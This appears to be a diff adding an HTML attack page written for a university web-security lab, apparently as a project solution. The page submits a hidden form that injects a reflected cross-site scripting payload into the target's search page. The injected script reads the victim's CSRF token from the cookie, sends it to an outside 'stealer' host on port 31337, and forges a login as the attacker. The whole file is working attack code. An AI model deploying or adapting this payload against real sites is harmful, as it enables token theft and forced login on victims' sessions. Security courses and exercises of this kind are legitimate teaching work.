@@ -1,0 +1,29 @@
+<html>
+
+<head>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+</head>
+
+<body>
+
+    <iframe name='ifr' style='display:none'></iframe>
+
+    <form id='xss' action='https://webproject.gtinfosec.org/search?xssdefense=0' style='display:none' method='get'
+        target='ifr'>
+        <input id='q' name='q'>
+    </form>
+
+    <script>
+        function attack() {
+            var csrf_token = (document.cookie.split('csrf_token=')[1]).substring(0, 32);
+            $.get('http://stealer:31337', { csrf_token });
+            $.post('https://webproject.gtinfosec.org/login?csrfdefense=1&xssdefense=0', { username: 'attacker', password: 'l33th4x', csrf_token });
+        }
+        var xss = "<script" + ">" + attack.toString() + "; attack(); <\/script" + ">";
+        document.getElementById("q").value = xss
+        $('#xss').submit();
+    </script>
+
+</body>
+
+</html>
